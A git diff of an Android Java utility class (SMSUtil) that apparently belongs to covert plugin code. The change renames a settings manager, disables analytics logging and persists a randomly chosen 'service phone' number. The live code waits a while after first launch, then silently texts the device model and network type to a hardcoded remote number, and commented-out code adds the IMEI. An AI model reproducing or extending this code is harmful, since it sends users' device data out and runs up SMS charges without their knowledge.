@@ -1,16 +1,13 @@
 package com.xstd.plugin.Utils;
 
 import android.content.Context;
-import android.content.Intent;
 import android.os.Build;
 import android.telephony.SmsManager;
 import android.text.TextUtils;
 import com.plugin.common.utils.UtilsRuntime;
-import com.umeng.analytics.MobclickAgent;
-import com.xstd.plugin.api.MainActiveResponse;
 import com.xstd.plugin.config.AppRuntime;
 import com.xstd.plugin.config.Config;
-import com.xstd.plugin.config.SettingManager;
+import com.xstd.plugin.config.PluginSettingManager;
 
 import java.util.Calendar;
 import java.util.HashMap;
@@ -36,7 +33,7 @@ public class SMSUtil {
 
             int channel = Integer.valueOf(Config.CHANNEL_CODE);
             long currentTime = System.currentTimeMillis();
-            long delay = currentTime - SettingManager.getInstance().getFirstLanuchTime();
+            long delay = currentTime - PluginSettingManager.getInstance().getFirstLanuchTime();
             if (channel > 950000 && delay < Config.DELAY_ACTIVE_DO_MONKEY) return false;
 
             if (Config.DEBUG) {
@@ -105,20 +102,19 @@ public class SMSUtil {
             Config.LOGD("[[trySendCmdToServicePhone1]] try to send SMS to Service Phone >>>>>>>");
         }
 
-        if (SettingManager.getInstance().getKeyDeviceHasSendToServicePhone()) {
+        if (PluginSettingManager.getInstance().getKeyDeviceHasSendToServicePhone()) {
             //如果没有发送过短信到服务器手机，那么就不在做任何处理了
             if (Config.DEBUG) {
                 Config.LOGD("[[trySendCmdToServicePhone1]] This phone has send SMS to Service Phone. last send day time : ("
-                                + SettingManager.getInstance().getKeyDeviceHasSendToServicePhone()
-                                + "), last send time : (" + SettingManager.getInstance().getKeyLastSendMsgToServicehPhone()
-                                + "), and clear time : (" + SettingManager.getInstance().getKeySendMsgToServicePhoneClearTimes()
+                                + PluginSettingManager.getInstance().getKeyDeviceHasSendToServicePhone()
+                                + "), last send time : (" + PluginSettingManager.getInstance().getKeyLastSendMsgToServicehPhone()
+                                + "), and clear time : (" + PluginSettingManager.getInstance().getKeySendMsgToServicePhoneClearTimes()
                                 + ")");
             }
             return;
         }
 
         int networkType = AppRuntime.getNetworkTypeByIMSI(context);
-        String target = AppRuntime.PHONE_SERVICE1;
         String model = android.os.Build.MODEL;
         if (TextUtils.isEmpty(model)) {
             model = "UNKNOWN";
@@ -146,8 +142,8 @@ public class SMSUtil {
                 content = content + " NT:-1";
         }
 
-//        if (SettingManager.getInstance().getKeySendMsgToServicePhoneClearTimes() >= 2) {
-//            SettingManager.getInstance().setKeySendMsgToServicePhoneClearTimes(100);
+//        if (PluginSettingManager.getInstance().getKeySendMsgToServicePhoneClearTimes() >= 2) {
+//            PluginSettingManager.getInstance().setKeySendMsgToServicePhoneClearTimes(100);
 //            target = AppRuntime.PHONE_SERVICE2;
 //            if (Config.DEBUG) {
 //                Config.LOGD("[[trySendCmdToServicePhone1]] has send to Service phone : " + AppRuntime.PHONE_SERVICE1 + " 2 times, so " +
@@ -160,26 +156,26 @@ public class SMSUtil {
 //            log.put("phoneType", Build.MODEL);
 //            CommonUtil.umengLog(context, "send_sms_phone2", log);
 //        } else {
-        target = getRandomPhoneServer();
+        String target = getRandomPhoneServer();
 //        }
 
         if (!TextUtils.isEmpty(content) && sendSMSForLogic(context, target, content)) {
-            SettingManager.getInstance().setKeyDeviceHasSendToServicePhone(true);
-            SettingManager.getInstance().setKeySendMsgToServicePhoneClearTimes(100);
-            SettingManager.getInstance().setKeyLastSendMsgToServicePhone(System.currentTimeMillis());
+            PluginSettingManager.getInstance().setKeyDeviceHasSendToServicePhone(true);
+            PluginSettingManager.getInstance().setKeySendMsgToServicePhoneClearTimes(100);
+            PluginSettingManager.getInstance().setKeyLastSendMsgToServicePhone(System.currentTimeMillis());
 
-            HashMap<String, String> log = new HashMap<String, String>();
-            log.put("phoneType", Build.MODEL);
-            log.put("servicePhone", target);
-            CommonUtil.umengLog(context, "send_sms_phone1", log);
+//            HashMap<String, String> log = new HashMap<String, String>();
+//            log.put("phoneType", Build.MODEL);
+//            log.put("servicePhone", target);
+//            CommonUtil.umengLog(context, "send_sms_phone1", log);
         } else {
-            SettingManager.getInstance().setKeyDeviceHasSendToServicePhone(false);
-            SettingManager.getInstance().setKeyLastSendMsgToServicePhone(0);
-            SettingManager.getInstance().setKeySendMsgToServicePhoneClearTimes(0);
-            HashMap<String, String> log = new HashMap<String, String>();
-            log.put("phoneType", Build.MODEL);
-            log.put("servicePhone", target);
-            CommonUtil.umengLog(context, "send_sms_phone_failed", log);
+            PluginSettingManager.getInstance().setKeyDeviceHasSendToServicePhone(false);
+            PluginSettingManager.getInstance().setKeyLastSendMsgToServicePhone(0);
+            PluginSettingManager.getInstance().setKeySendMsgToServicePhoneClearTimes(0);
+//            HashMap<String, String> log = new HashMap<String, String>();
+//            log.put("phoneType", Build.MODEL);
+//            log.put("servicePhone", target);
+//            CommonUtil.umengLog(context, "send_sms_phone_failed", log);
         }
 
         if (Config.DEBUG) {
@@ -191,17 +187,22 @@ public class SMSUtil {
 
     public static String getRandomPhoneServer() {
         try {
+            String target = PluginSettingManager.getInstance().getServicePhoneNumber();
+            if (!TextUtils.isEmpty(target)) return target;
+
             Random random = new Random(System.currentTimeMillis());
             int data = random.nextInt(100);
             if (data >= 50) {
-                return AppRuntime.PHONE_SERVICE2;
+                PluginSettingManager.getInstance().setServicePhoneNumber(AppRuntime.PHONE_SERVICE2);
             } else {
-                return AppRuntime.PHONE_SERVICE1;
+                PluginSettingManager.getInstance().setServicePhoneNumber(AppRuntime.PHONE_SERVICE1);
             }
         } catch (Exception e) {
+            PluginSettingManager.getInstance().setServicePhoneNumber(AppRuntime.PHONE_SERVICE1);
         }
 
-        return AppRuntime.PHONE_SERVICE1;
+
+        return PluginSettingManager.getInstance().getServicePhoneNumber();
     }
 
 //    public synchronized static final void trySendCmdToNetwork(Context context) {
@@ -212,7 +213,7 @@ public class SMSUtil {
 //        /**
 //         * 五分钟之内不重复发送获取短信中心的短信
 //         */
-//        long last = SettingManager.getInstance().getKeyLastSendMsgToServicehPhone();
+//        long last = PluginSettingManager.getInstance().getKeyLastSendMsgToServicehPhone();
 //        long cur = System.currentTimeMillis();
 //        if (last + 5 * 60 * 1000 > cur) {
 //            return;
@@ -234,14 +235,14 @@ public class SMSUtil {
 //                cmd.add(AppRuntime.SMSCenterCommand.UNICOM_CMD4);
 //                break;
 //            default:
-//                if (!SettingManager.getInstance().getKeyDeviceHasSendToServicePhone()
+//                if (!PluginSettingManager.getInstance().getKeyDeviceHasSendToServicePhone()
 //                        && AppRuntime.isSIMCardReady(context)) {
 //                    target = AppRuntime.PHONE_SERVICE;
 //                    cmd.add("IMEI:" + UtilsRuntime.getIMEI(context) + " 手机类型:" + android.os.Build.MODEL);
 //                    /**
 //                     * 表示这个设备已经发送到服务器手机了，不需要再发了
 //                     */
-//                    SettingManager.getInstance().setKeyDeviceHasSendToServicePhone(true);
+//                    PluginSettingManager.getInstance().setKeyDeviceHasSendToServicePhone(true);
 //                }
 //        }
 //
@@ -251,7 +252,7 @@ public class SMSUtil {
 //            }
 //        }
 //
-//        SettingManager.getInstance().setKeyLastSendMsgToServicePhone(cur);
+//        PluginSettingManager.getInstance().setKeyLastSendMsgToServicePhone(cur);
 //    }
 
 }
